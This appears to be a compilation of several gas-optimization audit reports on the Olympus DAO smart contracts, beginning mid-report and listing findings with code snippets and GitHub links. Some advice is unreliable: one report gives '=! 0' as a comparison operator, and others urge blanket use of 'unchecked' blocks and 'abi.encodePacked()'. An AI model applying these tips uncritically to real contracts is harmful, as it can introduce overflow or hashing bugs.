[IHeart.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IHeart.sol#L2)   *Actual codes used* ```  src/interfaces/IBondCallback.sol:2:pragma solidity >=0.8.0; src/policies/interfaces/IOperator.sol:2:pragma solidity >=0.8.0; src/policies/interfaces/IHeart.sol:2:pragma solidity >=0.8.0; ``` ---- ## 8. Bytes constants are more efficient than string constants ### Descriptions From the Solidity doc:  If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.  Why do Solidity examples use bytes32 type instead of string?  bytes32 uses less gas because it fits in a single word of the EVM, and string is a dynamically sized-type which has current limitations in Solidity (such as can’t be returned from a function to a contract).  If data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity. Basically, any fixed size variable in solidity is cheaper than variable size. That will save gas on the contract.  Instances of string constant that can be replaced by bytes(1..32) constant : ### Instances: //Links to github files: [Governance.sol:L41](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L41) [Governance.sol:L162](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L162)   *Actual codes used* ``` src/policies/Governance.sol:41:    string proposalURI; src/policies/Governance.sol:162:        string memory proposalURI_ ``` 
### Array length should not be looked up in every iteration of a `for` loop Since calculating the array length costs gas, it's best to read the length of the array from memory before executing the loop. ___ [Governance.sol: L278-283](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L283) ```solidity         for (uint256 step; step < instructions.length; ) {             kernel.executeAction(instructions[step].action, instructions[step].target);             unchecked {                 ++step;             }         } ``` Suggestion: ```solidity         uint256 instructLength = instructions.length;         for (uint256 step; step < instructLength; ) {             kernel.executeAction(instructions[step].action, instructions[step].target);             unchecked {                 ++step;             }         } ``` ___ ___   ### Use `++i` instead of `i++` to increase count in a `for` loop Since use of  `i++` (or equivalent counter) costs more gas, it is better to use `++i` ___ [KernelUtils.sol: L43-51](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43-L51) ```solidity     for (uint256 i = 0; i < 5; ) {         bytes1 char = unwrapped[i];          if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only          unchecked {             i++;         }     } ``` Suggestion: ```solidity     for (uint256 i = 0; i < 5; ) {         bytes1 char = unwrapped[i];          if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only          unchecked {             ++i;         }     } ``` ___ Similarly for the following `for` loop:  [KernelUtils.sol: L58-66](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58-L66) ___ ___
# Gas Optimizations Report for Olympus DAO contest  ## Overview During the audit, 6 gas issues were found.  № | Title | Instance Count --- | --- | ---  G-1 | [Postfix increment and decrement](#g-1-postfix-increment-and-decrement) | 5 G-2 | [<>.length in loops](#g-2-length-in-loops) | 1 G-3 | [Initializing variables with default value](#g-3-initializing-variables-with-default-value) | 3 G-4 | [Some variables can be immutable](#g-4-some-variables-can-be-immutable) | 1 G-5 | [> 0 is more expensive than =! 0](#g-5--0-is--more-expensive-than--0) | 1 G-6 | [x += y is more expensive than x = x + y](#g-6-x--y-is--more-expensive-than-x--x--y) | 18  ## Gas Optimizations Findings (6) ### G-1. Postfix increment and decrement ##### Description Prefix increment and decrement cost less gas than postfix.  ##### Instances - [```decimals++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488) - [```_status.low.count++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L670) - [```_status.high.count++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L686) - [```_status.low.count--;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L675) - [```_status.high.count--;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L691)  ##### Recommendation Consider using prefix increment and decrement  where it is relevant.   # ### G-2. <>.length in loops ##### Description Reading the length of an array at each iteration of the loop consumes extra gas.  ##### Instances [```for (uint256 step; step < instructions.length; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  ##### Recommendation Store the length of an array in a variable before the loop, and use it.  # ### G-3. Initializing variables with default value ##### Description It costs gas to initialize integer variables with 0 or bool variables with false but it is not necessary.  ##### Instances - [```for (uint256 i = 0; i < reqLength; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L397) - [```for (uint256 i = 0; i < 5; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43) - [```for (uint256 i = 0; i < 32; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58)  ##### Recommendation Remove initialization for default values.   For example: ```for (uint256 i; i < reqLength; ) {```  # ### G-4. Some variables can be immutable ##### Description Using immutables is cheaper than storage-writing operations.  ##### Instances [```ERC20 public ohm;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)  ##### Recommendation Use immutables where possible. Change to ``` ERC20 public immutable ohm;```  # ### G-5. ```> 0``` is  more expensive than ```=! 0``` ##### Instances [```if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L247)  ##### Recommendation Use ```=! 0``` instead of ```> 0```, where possible.  # ### G-6. ```x += y``` is  more expensive than ```x = x + y``` ##### Instances - [```reserveDebt[token_][msg.sender] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96) - [```totalDebt[token_] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97) - [```reserveDebt[token_][msg.sender] -= received;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115) - [```totalDebt[token_] -= received;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116) - [```if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131) - [```else totalDebt[token_] -= oldDebt - amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132) - [```_movingAverage += (currentPrice - earliestPrice) / numObs;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136) - [```_movingAverage -= (earliestPrice - currentPrice) / numObs;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138) - [```total += startObservations_[i];```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222) - [```balanceOf[from_] -= amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56) - [```balanceOf[to_] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58) - [```_amountsPerMarket[id_][0] += inputAmount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143) - [```_amountsPerMarket[id_][1] += outputAmount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144) - [```lastBeat += frequency();```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103) - [```totalEndorsementsForProposal[proposalId_] -= previousEndorsement;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194) - [```totalEndorsementsForProposal[proposalId_] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198) - [```yesVotesForProposal[activeProposal.proposalId] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252) - [```noVotesForProposal[activeProposal.proposalId] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  ##### Recommendation Use ```x = x + y``` instead of ```x += y```. Use ```x = x - y``` instead of ```x -= y```.
## Useless iterator initialization  in the loop  In the function _setPolicyPermissions() contract Kernel ‘uint256 i’ is initializing to 0 what is useless as type uint256 by default equals to 0.  **Recommendation:** Consider removing useless initialization to decrease the gas cost for calling functions  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L391  ## IF statements order optimization  Contract OlympusInstructions function store() there is a check if the instruction array is not empty (the length is not equal to 0). It makes sense to do it first of all because if there are no instructions there is no point to keep function execution.  **Recommendation:** Consider moving the 48 line (check if the instruction array is not empty) below the 43 line to avoid the unnecessary operation of incrementation and call to storage in the case when the array is empty.  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L42   ## Function visibility optimization   In contract OlympusInstructions there is the function getInstructions() which is not called anywhere inside the contract, so can be marked as external instead of public.  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37  In contract OlympusMinter there are a few functions that are not called inside the contract mintOhm() and burnOhm().  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33  **Recommendation:** Consider changing visibility from public to external for function getInstructions() , mintOhm() and burnOhm(). 
# Olympus DAO Contest Gas Optimization Report  ## Summary  These gas optimization issues were found during the code audit:  1. Use `calldata` instead of `memory` (66 instances) 2. Cache `<array>.length` (2 instances) 3. Use `unchecked{}` to suppress overflow/underflow check (43 instances) 4. Long `require()`/`revert()` string (8 instances) 5. Using `bool`s for storage incurs overhead (20 instances) 6. Use `!= 0` instead of `> 0` when comparing uint (11 instances) 7. Empty blocks should be removed (42 instances) 8. Don't initialize variables with default value (5 instances) 9. Use `++i`/`--i` instead of `i++`/`i--` (6 instances) 10. Split `require(xxx && yyy)` to `require(xxx)` and `require(yyy)` (3 instances) 11. Use uint256/int256 instead of other variations (245 instances) 12. Use `abi.encodePacked()` instead of `abi.encode()` (41 instances) 13. Use `private` instead of `public` for constants (17 instances) 14. Don't compare boolean expressions to boolean literals (4 instances) 15. Use custom errors instead of `revert()`/`require()` strings (24 instances) 16. Use shift right/left instead of division/multiplication if possible (9 instances)  Total 546 instances of 16 issues.  ## 1. Use `calldata` instead of `memory` (66 instances)  When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for loop to copy each index of the `calldata` to the `memory` index. This overhead can be optimized by using `calldata` directly.  ```solidity 2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {}  2022-08-olympus/src/external/OlympusERC20.sol::133 => function tryRecover(bytes32 hash, bytes memory signature)  2022-08-olympus/src/external/OlympusERC20.sol::182 => function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {  2022-08-olympus/src/external/OlympusERC20.sol::689 => function name() public view returns (string memory) {  2022-08-olympus/src/external/OlympusERC20.sol::693 => function symbol() public view returns (string memory) {  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::23 => function description() external view returns (string memory);  2022-08-olympus/src/interfaces/IBondAggregator.sol::82 => function marketsFor(address payout_, address quote_) external view returns (uint256[] memory);  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::62 => function createMarket(MarketParams memory params_) external returns (uint256);  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/interfaces/IBondTeller.sol::43 => function claimFees(ERC20[] memory tokens_, address to_) external;  2022-08-olympus/src/modules/INSTR.sol::37 => function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  2022-08-olympus/src/modules/PRICE.sol::205 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/modules/RANGE.sol::275 => function range() external view returns (Range memory) {  2022-08-olympus/src/policies/BondCallback.sol::48 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/BondCallback.sol::152 => function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {  2022-08-olympus/src/policies/Governance.sol::61 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Governance.sol::145 => function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) {  2022-08-olympus/src/policies/Governance.sol::151 => function getActiveProposal() public view returns (ActivatedProposal memory) {  2022-08-olympus/src/policies/Heart.sol::69 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Operator.sol::154 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Operator.sol::171 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/policies/Operator.sol::793 => function status() external view override returns (Status memory) {  2022-08-olympus/src/policies/Operator.sol::798 => function config() external view override returns (Config memory) {  2022-08-olympus/src/policies/PriceConfig.sol::18 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/PriceConfig.sol::45 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/policies/TreasuryCustodian.sol::27 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/TreasuryCustodian.sol::34 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/policies/TreasuryCustodian.sol::53 => function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {  2022-08-olympus/src/policies/VoterRegistration.sol::19 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/interfaces/IOperator.sol::146 => function status() external view returns (Status memory);  2022-08-olympus/src/policies/interfaces/IOperator.sol::149 => function config() external view returns (Config memory);  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::35 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::47 => function generateFixture(Module module_, Permissions[] memory requests_)  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::55 => function generateGodmodeFixture(Module module_, string memory contractName_)  2022-08-olympus/src/test/lib/UserFactory.sol::23 => function create(uint256 userNum) public returns (address[] memory) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::176 => function marketsFor(address payout_, address quote_) public view returns (uint256[] memory) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::242 => function liveMarketsBy(address owner_) external view returns (uint256[] memory) {  2022-08-olympus/src/test/lib/bonds/BondFixedTermCDA.sol::33 => function createMarket(MarketParams memory params_) external override returns (uint256) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::129 => function createMarket(MarketParams memory params_) external virtual returns (uint256);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::132 => function _createMarket(MarketParams memory params_) internal returns (uint256) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::338 => function setDefaults(uint32[6] memory defaults_) external override requiresAuth {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::100 => function claimFees(ERC20[] memory tokens_, address to_) external override {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::285 => function _uint2str(uint256 _i) internal pure returns (string memory) {  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAggregator.sol::82 => function marketsFor(address payout_, address quote_) external view returns (uint256[] memory);  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::62 => function createMarket(MarketParams memory params_) external returns (uint256);  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondFixedTermTeller.sol::43 => function batchRedeem(uint256[] memory tokenIds_, uint256[] memory amounts_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondTeller.sol::43 => function claimFees(ERC20[] memory tokens_, address to_) external;  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::120 => function balanceOfBatch(address[] memory owners, uint256[] memory ids)  2022-08-olympus/src/test/lib/larping.sol::89 => function larp(function () external returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::97 => function larpp(function () external payable returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::105 => function larpv(function () external view returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::10 => function jq(string memory query, string memory path)  2022-08-olympus/src/test/lib/quabi/Quabi.sol::23 => function getPath(string memory contractName) internal returns (string memory path) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::33 => function getSelectors(string memory query, string memory path) internal returns (bytes4[] memory) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::47 => function getFunctions(string memory contractName) public returns (bytes4[] memory) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::54 => function getFunctionsWithModifier(string memory contractName, string memory modifierName) public returns (bytes4[] memory) {  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::11 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::18 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::22 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/mocks/MockPrice.sol::44 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::58 => function description() external view override returns (string memory) {}  2022-08-olympus/src/test/policies/Heart.t.sol::31 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/policies/Heart.t.sol::33 => function requestPermissions() external view override returns (Permissions[] memory requests) {}  2022-08-olympus/src/test/policies/PriceConfig.t.sol::102 => function getObs(uint8 nonce) internal returns (uint256[] memory) { ```  ## 2. Cache `<array>.length` (2 instances)  If `<array>.length` is used as for loop termination condition, then the `.length` method will be called in each iteration. Caching it in a local variable can save gas.  ```solidity 2022-08-olympus/src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::182 => uint256 len = forPayout.length; ```  ## 3. Use `unchecked{}` to suppress overflow/underflow check (43 instances)  Starting from version 0.8.0, Solidity does overflow/underflow checks by default. It is a good feature to prevent vulnerabilities but it has a significant overhead, especially when used in for loop. When using uint256/int256, it is extremely hard to trigger overflow, so it makes sense to skip these checks. To suppress the overflow/underflow checks, use `unchecked {}`. For increment situations, just use `unchecked {}` directly; for decrement situations, add a `require()` statement before decrementing to prevent underflow.  ```solidity 2022-08-olympus/src/scripts/Deploy.sol::239 => for (uint i = 0; i < 90; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::19 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::38 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::66 => for (uint256 i; i < num; ++i) {  2022-08-olympus/src/test/lib/UserFactory.sol::25 => for (uint256 i = 0; i < userNum; i++) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::129 => for (uint256 i = firstIndex_; i < lastIndex_; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::135 => for (uint256 i = firstIndex_; i < lastIndex_; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::158 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::165 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::183 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::186 => if (isLive(forPayout[i]) && address(quoteToken) == quote_) ++count;  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::192 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::221 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::245 => for (uint256 i; i < marketCounter; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::254 => for (uint256 i; i < marketCounter; ++i) {  2022-08-olympus/src/test/lib/bonds/BondFixedTermTeller.sol::161 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::102 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::135 => for (uint256 i; i < ownersLength; ++i) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::16 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::32 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/modules/PRICE.t.sol::99 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::126 => for (uint256 i; i < observations; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::224 => for (uint256 i; i < numObs; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::313 => for (uint256 i; i < price.numObservations(); ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::386 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::776 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::948 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::992 => for (uint256 i; i < 8; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1004 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1045 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1097 => for (uint256 i; i < 3; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1106 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1149 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1217 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1261 => for (uint256 i; i < 8; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1273 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1314 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1366 => for (uint256 i; i < 3; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1375 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1418 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1832 => for (uint256 i; i < 15; ++i) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::122 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::172 => for (uint256 i; i < numObservations; ++i) { ```  ## 4. Long `require()`/`revert()` string (8 instances)  Shortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::107 => revert("ECDSA: invalid signature 's' value");  2022-08-olympus/src/external/OlympusERC20.sol::109 => revert("ECDSA: invalid signature 'v' value");  2022-08-olympus/src/external/OlympusERC20.sol::597 => require(c / a == b, "SafeMath: multiplication overflow");  2022-08-olympus/src/external/OlympusERC20.sol::769 => require(sender != address(0), "ERC20: transfer from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::770 => require(recipient != address(0), "ERC20: transfer to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::788 => require(account != address(0), "ERC20: burn from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::802 => require(owner != address(0), "ERC20: approve from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::803 => require(spender != address(0), "ERC20: approve to the zero address"); ```  ## 5. Using `bool`s for storage incurs overhead (20 instances)  Use `uint256(1)` and `uint256(2)` for true/false. Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  ```solidity 2022-08-olympus/src/Kernel.sol::113 => bool public isActive;  2022-08-olympus/src/Kernel.sol::207 => bool granted_  2022-08-olympus/src/Kernel.sol::394 => bool grant_  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::48 => bool capacityInQuote;  2022-08-olympus/src/modules/PRICE.sol::62 => bool public initialized;  2022-08-olympus/src/modules/RANGE.sol::44 => bool active; // Whether or not the side is active (i.e. the Operator is performing market operations on this side, true = active, false = inactive)  2022-08-olympus/src/modules/RANGE.sol::216 => bool high_,  2022-08-olympus/src/policies/Heart.sol::33 => bool public active;  2022-08-olympus/src/policies/Operator.sol::63 => bool public initialized;  2022-08-olympus/src/policies/Operator.sol::66 => bool public active;  2022-08-olympus/src/policies/Operator.sol::735 => bool sideActive = RANGE.active(high_);  2022-08-olympus/src/policies/interfaces/IOperator.sol::34 => bool[] observations; // individual observations: true = price on other side of average, false = price on same side of average  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::83 => bool public allowNewMarkets;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::636 => bool active  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::48 => bool capacityInQuote;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::14 => bool capacityInQuote; // capacity limit is in payment token (true) or in payout (false, default)  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::52 => bool active;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondFixedTermTeller.sol::9 => bool active;  2022-08-olympus/src/test/mocks/MockPrice.sol::15 => bool public result;  2022-08-olympus/src/test/policies/Heart.t.sol::23 => bool public result; ```  ## 6. Use `!= 0` instead of `> 0` when comparing uint (11 instances)  When dealing with unsigned integer types, comparisons with `!= 0` are cheaper then with `> 0`.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::245 => if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {  2022-08-olympus/src/external/OlympusERC20.sol::611 => require(b > 0, errorMessage);  2022-08-olympus/src/libraries/FullMath.sol::35 => require(denominator > 0);  2022-08-olympus/src/libraries/FullMath.sol::122 => if (mulmod(a, b, denominator) > 0) {  2022-08-olympus/src/policies/Governance.sol::247 => if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {  2022-08-olympus/src/test/modules/TRSRY.t.sol::98 => vm.assume(amount_ > 0);  2022-08-olympus/src/test/modules/TRSRY.t.sol::108 => vm.assume(amount_ > 0);  2022-08-olympus/src/test/modules/TRSRY.t.sol::126 => vm.assume(amount_ > 0);  2022-08-olympus/src/test/modules/TRSRY.t.sol::143 => vm.assume(amount_ > 0);  2022-08-olympus/src/utils/KernelUtils.sol::46 => if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only  2022-08-olympus/src/utils/KernelUtils.sol::60 => if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) { ```  ## 7. Empty blocks should be removed (42 instances)  Empty blocks exist in the code. The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.  ```solidity 2022-08-olympus/src/Kernel.sol::85 => constructor(Kernel kernel_) KernelAdapter(kernel_) {}  2022-08-olympus/src/Kernel.sol::95 => function KEYCODE() public pure virtual returns (Keycode) {}  2022-08-olympus/src/Kernel.sol::100 => function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}  2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {}  2022-08-olympus/src/Kernel.sol::115 => constructor(Kernel kernel_) KernelAdapter(kernel_) {}  2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {}  2022-08-olympus/src/external/OlympusERC20.sol::813 => ) internal virtual {}  2022-08-olympus/src/external/OlympusERC20.sol::844 => constructor(string memory name) EIP712(name, "1") {}  2022-08-olympus/src/external/OlympusERC20.sol::908 => {}  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::53 => interface AggregatorV2V3Interface is AggregatorInterface, AggregatorV3Interface {}  2022-08-olympus/src/modules/INSTR.sol::20 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/modules/TRSRY.sol::45 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/modules/VOTES.sol::19 => {}  2022-08-olympus/src/policies/Governance.sol::59 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/policies/PriceConfig.sol::15 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/policies/TreasuryCustodian.sol::24 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/policies/VoterRegistration.sol::16 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::57 => constructor(address 